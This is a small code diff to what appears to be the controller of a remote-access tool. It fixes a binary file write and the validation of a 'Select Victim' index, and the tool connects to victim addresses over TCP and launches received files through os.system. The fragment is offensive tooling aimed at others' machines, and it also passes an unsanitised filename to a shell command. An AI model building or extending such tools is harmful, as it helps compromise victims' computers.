@@ -11,10 +11,8 @@ protocol = {
 }
 
 def view_file(command, data):
-    print(command[5:])
-    print(data.decode())
     file = open(".\\" + command[5:], "wb")
-    file.write(data.decode())
+    file.write(data)
     file.close()
     os.system("start " + command[5:])
     input(">Del")
@@ -52,7 +50,7 @@ def telnet():
 
         while(1):
             index = input(f"Select Victim: ")   # choosing the victim
-            if index in range(0, len(address)):
+            if int(index) <= len(address) and int(index) > 0:
                 break
         s.connect((address[int(index) - 1], TCP_PORT))
 
